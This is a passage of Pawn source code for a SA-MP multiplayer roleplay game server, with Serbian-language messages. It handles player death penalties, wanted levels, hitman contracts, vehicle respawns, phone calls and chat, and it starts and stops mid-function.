		    sql_user_update_integer( killerid, "dm_event_kills", PlayerInfo[ killerid ][ xDMEventUbistva ] );
        }
        return 1;
    }

    if( EventInfo[ Started ] != 0 && PlayerInvited[ playerid ] != 0 )
	{
		EventInfo[ Drivers ]--;
		if(EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] != -1)
		{
		    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
			SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
			PlayerEventVehID[ playerid ] = -1;
		}
		PlayerInvited[ playerid ] = 0;
		PlayerCP[playerid] = 0;
	}

    if( IgracNosiPaket[ playerid ] && ( GetFactionType( playerid ) == ORG_TIP_MAFIJA || GetFactionType( playerid ) == ORG_TIP_BANDA ) )
	{
		new OrgID = PlayerInfo[ playerid ][ xClan ];

		RemovePlayerAttachedObject( playerid, OBJECT_SLOT_8 );
		SMG_DisablePlayerCheckpoint( playerid );

		CheckpointStatus[ playerid ] = 0;
        ServerInfo[ PaketNijeNaSvomMestu ] = true;
		IgracNosiPaket[ playerid ] = false;

		GetPlayerPos( playerid, PaketNewPos[ 0 ], PaketNewPos[ 1 ], PaketNewPos[ 2 ] );
        if( IsValidDynamicObject( ServerInfo[ PaketObject ] ) ) DestroyDynamicObject( ServerInfo[ PaketObject ] );

        ServerInfo[ PaketVreme ] = 3;
        SetTimer_("SmanjiPaketVreme", 1000, 1000, 4);
       	ServerInfo[ PaketObject ] = CreateDynamicObject(328, PaketNewPos[ 0 ], PaketNewPos[ 1 ], PaketNewPos[ 2 ], 0.0, 0.0, 0.0, 0, 0, -1, .priority = 1);

        format( str, sizeof( str ), "%s", GetPlayerLocation( playerid ) );

		foreach( new i : Player)
		{
        	if( GetFactionType( i ) == ORG_TIP_MAFIJA || GetFactionType( i ) == ORG_TIP_BANDA || PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSpecAdmin ] > 0 )
			{
				SCMF( i, ZUTA, "(PAKET): {CCCCCC}%s[%s] {FFFF00}je ubijen i ispao mu je paket.", ImeIgraca( playerid ), org_info[ OrgID ][ oPreFix ] );
				SCMF( i, ZUTA, "(PAKET): Lokacija: {FFFFFF}%s.", str );
				SendClientMessage( i, ZUTA, "(PAKET): Ukoliko niko ne pokupi paket narednih 10 minuta, paket ce nestati." );
			}
		}

		ServerInfo[ PaketTimer ] = SetTimer_("DestroyPaket", 1, 600000, 1);
	}

    if( PlayerInBlowJob[ playerid ] != 0 )
	{
		switch( PlayerInBlowJob[ playerid ] )
		{
	        case 1:
			{
				DestroyDynamicActor( Sex_Lisa );
				WhoreLisa = false;
			}
	        case 2:
			{
				DestroyDynamicActor( Sex_Angelina );
				WhoreAngelina = false;
			}
	        case 3:
			{
				DestroyDynamicActor( Sex_Mia );
				WhoreMia = false;
			}
	        case 4:
			{
				DestroyDynamicActor( Sex_Sendy );
				WhoreSendy = false;
			}
		}

		StopAudioStreamForPlayer( playerid );
	    SetCameraBehindPlayer( playerid );
        PlayerInBlowJob[ playerid ] = 0;
    	SexTDControl( playerid, false );
    	BlowJobCount[ playerid ] = 0;
	    TogPlayerHud( playerid );
	    SMG_TogglePlayerControllable( playerid, ( true ) );
		ClearAnimations( playerid );
    	KillTimer(PusenjeTimer[playerid]);
	}

	if( SearchNadji[ playerid ] != -1 )
	{
		SearchNadji[ playerid ] = -1;
		SMG_DisablePlayerCheckpoint( playerid );
	}

	if( ProcesSvercanja[ playerid ] > 0 )
	{
		SMG_DisablePlayerCheckpoint( playerid );
		ProcesSvercanja[ playerid ] = 0;
		if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_8 ) ) RemovePlayerAttachedObject( playerid, OBJECT_SLOT_8 );
		CheckpointStatus[ playerid ] = 0;
  		PlayerInfo[ playerid ][ xSvercer ] = 5;

  		if( IDVozilaKojimSverca[ playerid ] != -1 ) KutijaMatsa[ IDVozilaKojimSverca[ playerid ] ] = false;
        IDVozilaKojimSverca[ playerid ] = -1;
	}

	if( gZone_gID[ playerid ] != -1 )
	{
		new gZone__ID = gZone_gID[ playerid ];

		ZoneStopFlashForAll( gZoneInfo[ gZone__ID ][ gZoneID ] );
	    gZone_Time[ playerid ] = 0;
	    gZone_ShowTeammates[ playerid ] = 1;
	    KillTimer(gZone_Timer[playerid]);

	    if( gZoneInfo[ gZone__ID ][ gZoneGangID ] != -1 )
		{
            OrgPoruka( gZoneInfo[ gZone__ID ][ gZoneGangID ], 0x00F2FFFF, "(TERITORIJA): Clan suparnicke organizacije {FFFFFF}%s {00F2FF}koji je zauzimao teritoriju je ubijen.", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oName ] );
		}

        OrgPoruka( PlayerInfo[ playerid ][ xClan ], 0x00F2FFFF, "(TERITORIJA): Clan {FFFFFF}%s {00F2FF}je ubijen te je prestao sa zauzimanjem.", ImeIgraca( playerid ) );

	    gZone_gID[ playerid ] = -1;
	}

	if( IDVozilaKojimSverca[ playerid ] != -1 ) KutijaMatsa[ IDVozilaKojimSverca[ playerid ] ] = false;

	if( PlayerInfo[ playerid ][ xHitmenCena ] > 0 )
	{
	    if( IsPlayerConnected( killerid ) )
		{
			if( org_info[ PlayerInfo[ killerid ][ xClan ] ][ oTip ] == ORG_TIP_HITMAN )
			{
		        if( HitmanInfo[ killerid ][ GoChase ] == playerid )
				{
					DajIgracuNovac( killerid, PlayerInfo[ playerid ][ xHitmenCena ] );

                    for( new id = 1; id < MAX_ORG; id++)
					{
		    			if( org_info[ id ][ oTip ] == ORG_TIP_HITMAN )
						{ 
							OrgPoruka( id, ZUTA, "(CONTRACT): Agent {FFFFFF}%s {FFFF00}je izvrsio svoju narudzbu {FFFFFF}%s {FFFF00}i zaradio {FFFFFF}($%s).", 
								ImeIgraca( killerid ), ImeIgraca( playerid ), fNumber(PlayerInfo[ playerid ][ xHitmenCena ]));
						}
					} 

					DodajWarnRed("~y~(CONTRACT): %s ~w~je ubi%s ~y~%s.", ImeIgraca( killerid ), PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ) );

					PlayerInfo[ playerid ][ xHitmenCena ] = 0;
					sql_user_update_integer( playerid, "hitman_price", PlayerInfo[ playerid ][ xHitmenCena ] );

					HitmanInfo[ killerid ][ GoChase ] = 999;
					HitmanInfo[ playerid ][ GetChased ] = 999;
					HitmanInfo[ playerid ][ GotHit ] = 0;
				}
			}
		}
	}

	if( PlayerInfo[ playerid ][ xLevel ] >= 5 && NaDmEventu[ playerid ] == false && WARPInfo[ playerid ][ WARIgrac ] == -1 && tdm_player_info[ playerid ][ tdm_Team ] == 0 && GetFactionType( playerid ) != ORG_TIP_VLADINA )
	{
	    new Float:pPosX, Float:pPosY, Float:pPosZ;
		GetPlayerPos( playerid, pPosX, pPosY, pPosZ );
		new weaponsa[ 13 ][ 2 ];
	    for( new i_slot = 0; i_slot < 13; i_slot++ )
		{
			GetPlayerWeaponData( playerid, i_slot, weaponsa[ i_slot ][ 0 ], weaponsa[ i_slot ][ 1 ] );
			if( weaponsa[ i_slot ][ 0 ] != 0 && IsValidServerWeapon( playerid, weaponsa[ i_slot ][ 0 ] ) && weaponsa[ i_slot ][ 1 ] != 0 )
			{
				CreateDroppedGun( weaponsa[ i_slot ][ 0 ], weaponsa[ i_slot ][ 1 ], pPosX+random(2)-random(2), pPosY+random(2)-random(2), pPosZ );
			}
		}
	}

    OfficerUndercover[playerid] = false;

	if( PljackaVreme[ playerid ] > 0 )
	{
		KillTimer(PljackanjeBankeTimer[ playerid ]);
		PljackaUToku = false;
	}

	if( ZlatoVreme[ playerid ] > 0 )
	{
		KillTimer(PljackanjeZlatareTimer[ playerid ]);
		ZlataraUToku = false;
	}

	if( killerid == IPI )
	{
	    if( PlayerInfo[ playerid ][ xWanted ] > 0 && PlayerInfo[ playerid ][ xZatvor ] == 0 )
		{
	        foreach( new i : Player)
			{
				if( GetFactionType( i ) == ORG_TIP_VLADINA && CrimInRange( 40.0, playerid, i ) )
				{
			        new price = PlayerInfo[ playerid ][ xWanted ] * 10000;
			        //if( price > 30000 ) price = 30000;
			        SCMF( playerid, 0xFF6347FF, "(DEATH): Gubite $%s jer ste izvrsili samoubistvo dok ste sa %d WL bezali od policije.", fNumber(price), PlayerInfo[ playerid ][ xWanted ] );

					DajIgracuNovac( playerid, -price );

			        PlayerInfo[ playerid ][ xWanted ] = 0;
					SMG_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ] );
					strmid( ZlocinInfo[ playerid ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
					strmid( ZlocinInfo[ playerid ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
					strmid( ZlocinInfo[ playerid ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );

					sql_user_update_integer( playerid, "wanted_level", PlayerInfo[ playerid ][ xWanted ] );

					for( new id = 1; id < MAX_ORG; id++)
					{
						if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
						{
						   	OrgPoruka( id, 0x2641FEAA, "(HQ): Osumniceni %s je izvrsio samoubistvo i izgubio $%d, over.", ImeIgraca( playerid ), price );
						}
					}
				}
			}
	    }
	}

	if( killerid != IPI )
	{
		foreach( new i : Player)
		{
			if(PlayerInfo[i][xAdmin] > 0 || PlayerInfo[i][xSpecAdmin] > 0) 
			{
				if( killerid == IPI || killerid == playerid ) SendDeathMessageToPlayer( i, -1, playerid, reason );
				else SendDeathMessageToPlayer( i, killerid, playerid, reason );
			}
		}
	}

	if( ( reason >= 0 && reason <= 34 ) || reason == 49 )
	{
	    if( killerid != IPI )
		{
		    if( GetFactionType( killerid ) != ORG_TIP_VLADINA && PlayerInvited[killerid] == 0 )
			{
			    if( PlayerInfo[ killerid ][ xZatvor ] != 0 )
				{
		            SendClientMessage( killerid, 0xFF6347FF, "(ZATVOR): Ubili ste igraca u zatvoru i dobili 10 minuta dodatne kazne.");
					PlayerInfo[ killerid ][ xZatvorVreme ] += 10;
		        }
		        else
				{
		    		PostaviWanted( killerid, "Ubistvo prvog stepena", "Nepoznati", 7 );
				}
			}

	        if( PlayerInfo[ playerid ][ xWanted ] >= 1 )
			{
			    new price;

				//if( PlayerInfo[ playerid ][ xWanted ] > 10 ) price = 5000;
				//else
				price = (PlayerInfo[ playerid ][ xWanted ] * 5000);

				if( GetFactionType( killerid ) == ORG_TIP_VLADINA )
				{
					DodajWarnRed("~b~#KILL: %s[%d][org: %s] ~w~je ubi%s igraca ~b~%s[%d] ~w~sa WL.", ImeIgraca( killerid ), killerid, org_info[ PlayerInfo[ killerid ][ xClan ] ][ oPreFix ], PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ), playerid );

                	GameTextForPlayer( killerid, "~w~Osumnjiceni ~r~Ubijen!", 5000, 1 );
					PlayerPlaySound( killerid, 1058, 0.0, 0.0, 0.0 );

					DajIgracuNovac( killerid, price );

					SCMF( killerid, 0xFF6347FF, "(KILL): Dobili ste {FFFFFF}$%d {FF6347}jer ste ubili osumnicenog koji je imao {FFFFFF}%d {FF6347}WL-a.", price, PlayerInfo[ playerid ][ xWanted ] );
				    SCMF( playerid, 0xFF6347FF, "(DEATH): Gubite {FFFFFF}$%d {FF6347}jer ste bezali od policije, a policajac vas je ubio.", price );

	                for( new id = 1; id < MAX_ORG; id++)
					{
						if( org_info[ id ][ oTip ] == ORG_TIP_VLADINA )
						{ 
						   	OrgPoruka( id, 0x2641FEAA, "(HQ): Officer %s je ubio osumnicenog %s(-$%d), over.", ImeIgraca( killerid ), ImeIgraca( playerid ), price );
						}
					}
				}
				else
				{
					if( PlayerInfo[ playerid ][ xLevel ] == 1 )
					{
						DodajWarnRed("~b~(ADMIN) %s(%d) ~w~je ubi%s NOVAJLIJU ~b~%s(%d) ~w~sa WL.", ImeIgraca( killerid ), killerid, PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ), playerid );
					}
					else if( PlayerInfo[ playerid ][ xClan ] == 0 )
					{
						DodajWarnRed("~b~(ADMIN) %s(%d) ~w~je ubi%s CIVILA ~b~%s(%d) ~w~sa WL.", ImeIgraca( killerid ), killerid, PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ), playerid );
					}
					else
					{
						DodajWarnRed("~b~(ADMIN) %s(%d) ~w~je ubi%s igraca ~b~%s(%d) ~w~sa WL.", ImeIgraca( killerid ), killerid, PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ), playerid );
					}

					SCMF( playerid, 0xFF6347FF, "(DEATH): Gubite {FFFFFF}$%d {FF6347}jer ste ubijeni sa WL-om.", price );
				}

				DajIgracuNovac( playerid, -price );

				PlayerInfo[ playerid ][ xWanted ] = 0;
				SMG_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ] );
				strmid( ZlocinInfo[ playerid ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ playerid ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ playerid ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );

				sql_user_update_integer( playerid, "wanted_level", PlayerInfo[ playerid ][ xWanted ] );
			}
			else if( PlayerInfo[ playerid ][ xWanted ] <= 0 )
			{
				if( GetFactionType( killerid ) == ORG_TIP_VLADINA )
				{
					if( PlayerInfo[ playerid ][ xLevel ] == 1 )
					{
						DodajWarnRed("~y~(ADMIN) %s(%d)(org: %s) ~w~je ubi%s novajliju ~y~%s(%d) ~w~bez WL-a.", ImeIgraca( killerid ), killerid, org_info[ PlayerInfo[ killerid ][ xClan ] ][ oPreFix ], PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ), playerid );
					}
					else if( PlayerInfo[ playerid ][ xClan ] == 0 )
					{
					    DodajWarnRed("~y~(ADMIN) %s(%d)(org: %s) ~w~je ubi%s civila ~y~%s(%d) ~w~bez WL-a.", ImeIgraca( killerid ), killerid, org_info[ PlayerInfo[ killerid ][ xClan ] ][ oPreFix ], PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ), playerid );
					}
					else
					{
						DodajWarnRed("~y~(ADMIN) %s(%d)(org: %s) ~w~je ubi%s igraca ~y~%s(%d) ~w~bez WL-a.", ImeIgraca( killerid ), killerid, org_info[ PlayerInfo[ killerid ][ xClan ] ][ oPreFix ], PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ), playerid );
					}
				}
            	else
				{
				    if( PlayerInfo[ playerid ][ xLevel ] == 1 )
					{
						DodajWarnRed("~b~(ADMIN) %s(%d) ~w~je ubi%s novajliju ~b~%s(%d) ~w~bez WL-a.", ImeIgraca( killerid ), killerid, PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ), playerid );
					}
					else if( PlayerInfo[ playerid ][ xClan ] == 0 )
					{
						DodajWarnRed("~b~(ADMIN) %s(%d) ~w~je ubi%s civila ~b~%s(%d) ~w~bez WL-a.", ImeIgraca( killerid ), killerid, PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ), playerid );
					}
					else
					{
						DodajWarnRed("~b~(ADMIN) %s(%d) ~w~je ubi%s igraca ~b~%s(%d) ~w~bez WL.", ImeIgraca( killerid ), killerid, PlayerInfo[killerid][xPol] == 1 ? "o" : "la", ImeIgraca( playerid ), playerid );
					}
				}
			}
		}
	}

	/*if( PlayerInfo[ playerid ][ xWanted ] >= 1 )
	{
		new price = PlayerInfo[ playerid ][ xWanted ] * 500;
		DajIgracuNovac( playerid, -price );
        SCMF( playerid, ZUTA, "(DEATH): Umrli ste sa wanted levelom i oduzeto vam je $%d.", price );
        PlayerInfo[ playerid ][ xWanted ] = 0;
        sql_user_update_integer( playerid, "wanted_level", PlayerInfo[ playerid ][ xWanted ] );
	}*/

    if( Draged[ playerid ] != -1 )
	{
		KillTimer(DragTimer[Draged[playerid]]);
		DragedPlayerID[ Draged[ playerid ] ] = -1;
		Draged[ playerid ] = -1;
	}
	if( DragedPlayerID[ playerid ] != -1)
	{
		KillTimer(DragTimer[ playerid ]);
		DragedPlayerID[ playerid ] = -1;
		Draged[ DragedPlayerID[ playerid ] ] = -1;
	}

    if( IsValidDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] ) ) DestroyDynamicMapIcon( PlayerGpsRadar[ playerid ][ _pgrIconId ] );
    if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] ) ) DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
	if( IsValidDynamicCP( PlayerGpsRadar[ playerid ][ _pgrCheckPointId ] ) ) DestroyDynamicCP( PlayerGpsRadar[ playerid ][ _pgrCheckPointId ] );

	KillTimer(_progressatmbar[playerid]);

    PlayerGpsRadar[ playerid ][ _pgrIconId ] = -1;
    PlayerGpsRadar[ playerid ][ _pgrObject ] = -1;

    if(as_Buying[playerid] == true)
	{
 	    as_Buying[playerid] = false;
 	    ControlTextDrawVehBuy(playerid, false);
		TogPlayerHud(playerid);
	}

	if( TrashSearch[ playerid ] == 1 )
	{
		KillTimer(TrashTimer[playerid]);
		TrashSearch[ playerid ] = 0;
	}

	if(CuffTimerCalled[playerid]) KillTimer(tazovan_tajmer[playerid]);

	if( Mobile[playerid] != -1 )
	{
		SendClientMessage( Mobile[playerid], 0xBFC0C2FF, "*** Linija prekinuta...");
		CellTime[Mobile[playerid]] = 0;
		CellTime[playerid] = 0;
		Mobile[Mobile[playerid]] = -1;
		Mobile[playerid] = -1;
	}

    UzeoOpremu[ playerid ] = false;
    PosaoPMunicijeCP[playerid] = 0;
    PosaoPMunicijeTable[playerid] = 0;
    PosaoPNovcaCP[playerid] = 0;
    PosaoUberCP[playerid] = 0;
    PosaoPNamjestajaCP[playerid] = 0;
    PosaoMehanicarCP[playerid] = false;
    PosaoRudar[playerid] = 0;
    LetZG[playerid] = 0;
    LetSA[playerid] = 0;

    DisablePlayerCheckpoint(playerid);

    if( AdminDuty[ playerid ] )
	{
    	AdminDuty[ playerid ] = false;
	}
	SMG_SetPlayerColor( playerid );
	return 1;
}

//------------------------------------------------------------------------------

public OnTrailerUpdate(playerid, vehicleid)
{
    if(!OkacioTrailer[playerid]) DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
    return 0;
}

//------------------------------------------------------------------------------

public OnVehicleSpawn( vehicleid )
{
    new engine, lights, alarm, doors, bonnet, boot, objective;

    if( VehicleInfo[ vehicleid ][ vSqlID ] != 0 ) SetVehicleLabels( vehicleid );

    occupied[ vehicleid ] = false;

    new Float:x, Float:y, Float:z;
	GetVehiclePos( vehicleid, x, y, z );
	RealVehiclePositions[ vehicleid ][ 0 ] = x;
	RealVehiclePositions[ vehicleid ][ 1 ] = y;
	RealVehiclePositions[ vehicleid ][ 2 ] = z;

   	GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
	SetVehicleParamsEx( vehicleid, engine, 0, alarm, 0, 0, 0, objective );

	if( VehicleInfo[ vehicleid ][ vUsage ] == PRIVATNO_VOZILO ) 
	{
	    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
	    SetVehicleParamsEx( vehicleid, engine, 0, alarm, VehicleInfo[ vehicleid ][ vLocked ], 0, 0, objective );

        LinkVehicleToInterior( vehicleid, VehicleInfo[ vehicleid ][ vInterior ] );
    	SetVehicleVirtualWorld( vehicleid, VehicleInfo[ vehicleid ][ vVirtualWorld ] );
	}

	if( VehicleInfo[ vehicleid ][ vSqlID ] != 0 ) TuneVehicle( vehicleid );

	vCanDrive[ vehicleid ] = 1;
	VehicleObjectCheck( vehicleid );
	ResetVehicleStatistics( vehicleid );

	if( IsVehicleBajs( vehicleid ) )
	{
	    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
		SetVehicleParamsEx( vehicleid, 1, 0, alarm, doors, 0, 0, objective );
	}
	return 1;
}

public OnVehicleDeath( vehicleid, killerid )
{
    //new ownerid = gLastDriver[ vehicleid ];
	VehicleObjectCheck( vehicleid );
	ResetVehicleStatistics( vehicleid );

	foreach(new playerid : Player)
	{
		if( AdminVozilo[ playerid ] == vehicleid )
		{
			VehicleInfo[ AdminVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ AdminVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( AdminVozilo[ playerid ] ), ResetVehicle( AdminVozilo[ playerid ] ), AdminVozilo[ playerid ] = -1;
			break;
		}
		if( VipVozilo[ playerid ] == vehicleid )
		{
			VehicleInfo[ VipVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ VipVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( VipVozilo[ playerid ] ), ResetVehicle( VipVozilo[ playerid ] ), VipVozilo[ playerid ] = -1;
			break;
		}
		if( PromoterVozilo[ playerid ] == vehicleid )
		{
			VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PromoterVozilo[ playerid ] ), ResetVehicle( PromoterVozilo[ playerid ] ), PromoterVozilo[ playerid ] = -1;
			break;
		}
		if( YTVozilo[ playerid ] == vehicleid )
		{
			VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( YTVozilo[ playerid ] ), ResetVehicle( YTVozilo[ playerid ] ), YTVozilo[ playerid ] = -1;
			break;
		}
		if( PosaoVozilo[ playerid ] == vehicleid )
		{
			VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PosaoVozilo[ playerid ] ), ResetVehicle( PosaoVozilo[ playerid ] ), PosaoVozilo[ playerid ] = -1;
			break;
		}
		if( PosaoTrailer[ playerid ] == vehicleid )
		{
			VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PosaoTrailer[ playerid ] ), ResetVehicle( PosaoTrailer[ playerid ] ), PosaoTrailer[ playerid ] = -1;
			break;
		}
		if( TrkaVozilo[ playerid ] == vehicleid )
		{
			SMG_DestroyVehicle( TrkaVozilo[ playerid ] ), ResetVehicle( TrkaVozilo[ playerid ] ), TrkaVozilo[ playerid ] = -1;
			break;
		}
		if( RentVozilo[ playerid ] == vehicleid )
		{
			KillTimer(RentTimer[playerid]);
			VehicleObjectCheck( RentVozilo[ playerid ] ), VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ]), ResetVehicle( RentVozilo[ playerid ] ), SMG_DestroyVehicle( RentVozilo[ playerid ] ), RentVozilo[ playerid ] = -1;
			break;
		}
	}
	return 1;
}

VehicleObjectCheck( vehicleid )
{
	if( vehicleid != -1 )
	{
	    if( Neon[ vehicleid ] == 1 )
		{
	 		Neon[ vehicleid ] = 0;
		    DestroyDynamicObject( NeonObject1[ vehicleid ] );
	     	DestroyDynamicObject( NeonObject2[ vehicleid ] );
		}

		if( Siren[ vehicleid ] == 1 )
		{
		    Siren[ vehicleid ] = 0;
	 		DestroyDynamicObject( SirenObject[ vehicleid ] );
		}

		if( DragRaceAttachs[ vehicleid ] == true )
		{
	 		DragRaceAttachs[ vehicleid ] = false;
		    for(new i; i < 11; i++) DestroyDynamicObject( DragRaceAttach[ vehicleid ][i] );
		}

		if( CarSign[ vehicleid ] == 1) 
		{
		    CarSign[ vehicleid ] = 0;
			DestroyDynamic3DTextLabel( vehicle3Dtext[ vehicleid ] );
	    }
	}
}

strtok(const string[], &index)
{
	new length = strlen(string);
	while((index < length) && (string[index] <= ' '))
	{
		index++;
	}

	new offset = index,
	    result[20];

	while((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}

	result[index - offset] = EOS;
	return result;
}

_:public CellphoneCheck( playerid )
{
	if( CellTime[playerid] > 0 )
	{
		if( CellTime[playerid] == cchargetime )
		{
			CellTime[playerid] = 1;

			if( Mobile[Mobile[playerid]] == playerid )
			{
				CallCost[playerid] += callcost;
			}
		}

		CellTime[playerid] += 1;

		if( Mobile[Mobile[playerid]] == -1 && CellTime[playerid] == 5 )
		{
			SendNearbyMessage(Mobile[playerid], 15.0, 0xC2A2DAFF, "* %s zvoni mobilni telefon.", ImeIgraca( Mobile[playerid] ) );
		}
	}
	if( CellTime[playerid] == 0 && CallCost[playerid] > 0 )
	{
		format( globalstring, 50, "~w~Cena poziva~n~~r~$%d", CallCost[playerid]+4 );
		GameTextForPlayer( playerid, globalstring, 5000, 1 );
		PlayerInfo[ playerid ][ xTelefonBon ] -= CallCost[playerid]+4;
		CallCost[playerid] = 0;
	}
	return 1;
}

_:public SearchingHit( playerid )
{
	new searchhit = 0;
	foreach( new i : Player)
	{
		if( searchhit == 0 )
		{
  			if( PlayerInfo[ i ][ xHitmenCena ] > 0 && HitmanInfo[ i ][ GotHit ] == 0 && org_info[ PlayerInfo[ i ][ xClan ] ][ oTip ] != ORG_TIP_HITMAN )
  			{
		        searchhit = 1;
		        hitfound = 1;
		        ahitid = i;
		        foreach( new k : Player)
				{
				    if( org_info[ PlayerInfo[ k ][ xClan ] ][ oTip ] == ORG_TIP_HITMAN )
					{
				        SendClientMessage( k, 0x33CCFFFF, "*** Nova Poruka: Nova meta je dostupna. ***");
						SCMF( k, 0x33CCFFFF, "Osoba: %s[%d] | Vrednost: $%d", ImeIgraca( i ), i, PlayerInfo[ i ][ xHitmenCena ] );
						SendClientMessage( k, ZUTA, "*** Koristite (/givehit [ID]) da biste dodjelili metu jednome od vasih agenata.");
	      			}
      			}
				return 1;
		    }
		}
	}
	if( searchhit == 0 )
	{
	    SendErrorMessage( playerid, "Nema dostupnih meta!");
	}
	return 0;
}

public OnPlayerText(playerid, text[])
{
	if( gettime() < PlayerInfo[ playerid ][ xMute ] )
	{
		SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
		return 0;
	}
	if( PlayerCuffed[ playerid ] >= 1 )
	{
	    SendErrorMessage( playerid, "Ne mozes pricati kad si cuffovan ili tazovan.");
		return 0;
	}
	if( Spectate[playerid] != -1 )
	{
	    SendErrorMessage( playerid, "Ne mozes pricati dok specas.");
		return 0;
	}
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 && PlayerInfo[ playerid ][ xSpecAdmin ] < 1 && PlayerInfo[ playerid ][ xGamemaster ] < 1 )
	{
	 	if( gettime() < antiCheatCS[ playerid ][ SpamChat ] )
 		{
		    SendClientMessage( playerid, ANTICHEAT, "(ANTI-SPAM): Chat mozes koristiti svake 2 sekunde.");
			return 0;
		}
		antiCheatCS[ playerid ][ SpamChat ] = gettime()+2;
	}

	if( reactionTest )
	{
		if( strlen( reactionMessage[ 0 ] ) )
		{
            if(!strcmp(text, reactionMessage[ 0 ], false) && strcmp(text, "{777777}", false))
			{
                EndReaction( playerid );
                return 0;
            }
        }
    }
    else
	{
        if( !strcmp(text, reactionMessage[ 0 ], false ) && reactionWon )
		{
            if( !strcmp( reactionWinner, ImeIgraca( playerid ), false ) ) reactionMessage[ 1 ] = "(REACTION): Vi ste vec odgovorili.";
            else format( reactionMessage[ 1 ], 144, "(REACTION): Kasno! {FFFFFF}%s {E57BD2}je odgovorio/la prvi/a.", reactionWinner );

            SendClientMessage( playerid, 0xE57BD2FF, reactionMessage[ 1 ] );
            return 0;
        }
    }

    new tmp[144], idx;
    if(IsPlayerInDynamicArea(playerid, bankaSalter))
    {
    	tmp = strtok(text, idx);
		if((strcmp("pomoc", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("pomoc")))
		{
			ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{428F47}CB | {FFFFFF}Help:",
																"{FFFFFF}* Hello!\n\
																\t{428F47}Dobrodosli u Centralnu Banku Los Santosa, ovdje mozete otvoriti vas racun, poloziti vas novac, podici kredit i do $100.000, prebaciti novac na drugi racun i slicno.\n\
																\t{428F47}Ukoliko trebate nase usluge podjite stepenicama na drugi sprat i idite do saltera koji vam treba.\n\n\
																{FFFFFF}* Illegal\n\
																\t{428F47}Eh sada za vas ilegalce, zelite opljackati ovu predivnu ustanovu? Nema frke!\n\
																\t{428F47}Prvo sto trebate jeste neko vatreno oruzje, drugo jeste alat ili toolkit.\n\
																\t{428F47}Kada imate oruzje idite pored ATMova do kancelarije menadzera i uperite oruzje u njega kako bi vam otvorio prva vrata.\n\
																\t{428F47}Onda prodjite kroz prva vrata na spratu i uradite isto sa cuvarom, onda opet prodjite kroz vrata i uradite isto nad trecim.\n\
																\t{428F47}Kada ste to uradili udjite u sef banke, pokrenite pljacku komandom /pljackajbanku i to je to, prosto zar ne? Cuvajte se policije!\n\
																\t{FFFFFF}** Srdacan pozdrav!", "Uredu", "");
			return 0;
		}
    } 
    
   	if(matka && IsNumeric(text)) 
   	{
 		if(rezultat == strval(text))
 		{
 			new MatCash = random(2000)+random(2000);
	   	    matka = false;
